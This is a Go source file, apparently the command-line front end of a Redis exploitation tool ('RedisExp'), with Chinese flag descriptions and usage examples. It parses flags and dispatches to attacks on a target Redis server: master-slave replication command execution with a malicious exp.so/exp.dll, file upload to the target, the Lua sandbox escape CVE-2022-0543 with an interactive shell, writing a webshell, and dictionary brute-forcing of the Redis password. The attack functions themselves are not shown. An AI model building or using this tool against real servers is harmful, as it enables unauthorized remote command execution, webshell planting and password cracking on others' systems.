package pkg

import (
	"flag"
	"fmt"
	"strings"
)

var (
	CMD     string
	console bool
	exec    bool
	upload  bool
	lua     bool
	shell   bool
	brute   bool
	pwdf    string
	PWD     string
	slaveof bool

	Rhost string
	Rport string

	Lhost string
	Lport string
	dll   string

	Rpath string
	Rfile string
	Lfile string

	p    string
	down bool

	cli bool
)

func init() {
	flag.BoolVar(&upload, "upload", false, "主从复制-文件上传")
	flag.BoolVar(&exec, "exec", false, "主从复制-命令执行")
	flag.BoolVar(&console, "console", false, "使用交互式 shell")
	flag.StringVar(&CMD, "c", "whoami", "执行命令")
	flag.StringVar(&dll, "so", "exp.dll", "设置 exp.dll | exp.so")

	flag.BoolVar(&lua, "lua", false, "Lua沙盒绕过命令执行 CVE-2022-0543")
	flag.BoolVar(&shell, "shell", false, "备份写 Webshell")

	flag.BoolVar(&brute, "brute", false, "爆破 Redis 密码")
	flag.StringVar(&pwdf, "pwdf", "", "设置密码字典")
	flag.StringVar(&PWD, "pwd", "", "设置密码")

	flag.BoolVar(&slaveof, "slaveof", false, "关闭主从复制")

	flag.StringVar(&Rhost, "rhost", "", "目标 IP")
	flag.StringVar(&Rport, "rport", "6379", "目标端口")

	flag.StringVar(&Lhost, "lhost", "", "本地 IP")
	flag.StringVar(&Lport, "lport", "21000", "本地端口")

	flag.StringVar(&Rpath, "rpath", ".", "保存在目标的目录")
	flag.StringVar(&Rfile, "rfile", "", "保存在目标的文件名")
	flag.StringVar(&Lfile, "lfile", "", "需要上传的文件名")

	flag.BoolVar(&down, "down", false, "开启 Http Sever")
	flag.StringVar(&p, "p", "9001", "设置 Http Sever 端口")

	flag.BoolVar(&cli, "cli", false, "执行 Redis 命令")
}

func Help() {
	flag.Parse()

	// 设置 httpServer , 用于传输 dump.rdb
	if down {
		httpServer(p)
		return
	}

	if Rhost == "" {
		Info("-h 靓仔查看下帮助吧")
		fmt.Println(`Example:
主从复制命令执行:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console

Linux:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -so exp.so
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console -so exp.so

主从复制文件上传:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -rfile dump.rdb -lfile dump.rdb -upload

主动关闭主从复制:
RedisExp.exe -rhost 192.168.211.131 -slaveof

Lua沙盒绕过命令执行 CVE-2022-0543:
RedisExp.exe -rhost 192.168.211.131 -lua -console

备份写 Webshell:
RedisExp.exe -rhost 192.168.211.131 -shell

爆破 Redis 密码:
RedisExp.exe -rhost 192.168.211.131 -brute -pwdf ../pass.txt

执行 Redis 命令:
RedisExp.exe -rhost 192.168.211.131 -cli

设置 HttpServer 接收上传的内容:
RedisExp.exe -down -p 6600
`)
		return
	}

	// 爆破密码
	if brute {
		if pwdf == "" {
			Info("缺少字典参数 -pwdf")
			return
		}
		readFile(pwdf)
		brutePWD()
		return
	}

	// 连接 Redis
	err := RedisClient(PWD)

	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") {
			Info("Redis 连接超时")
		}
		if strings.Contains(err.Error(), "NOAUTH Authentication required.") {
			Info("Redis 需要密码认证")
		}
		if strings.Contains(err.Error(), "ERR invalid password") {
			Info("Redis 认证密码错误!")
		}
		return
	}

	switch {
	case exec:
		if Lhost == "" {
			Info("缺少 Lhost 参数")
			return
		}
		if console {
			RedisSlave()
			loopCmd("exec")
		} else {
			RedisSlave()
			RunCmd(CMD)
			CloseSlave("exec")
		}

	case upload:
		if Rfile == "" || Lfile == "" || Lhost == "" {
			Info("rfile | lfile | lhost 参数不能为空")
			return
		}
		RedisUpload()

	case lua:
		if console {
			loopCmd("lua")
		} else {
			if CMD == "" {
				Info("缺少 cmd 参数, 无法执行命令哦")
				return
			}
			RedisLua(CMD)
		}

	case shell:
		GetShell()

	}

	// 关闭主从
	if slaveof {
		CloseSlave("")
		return
	}

	// 执行 Redis 命令
	if cli {
		loopRedis()
		return
	}

}
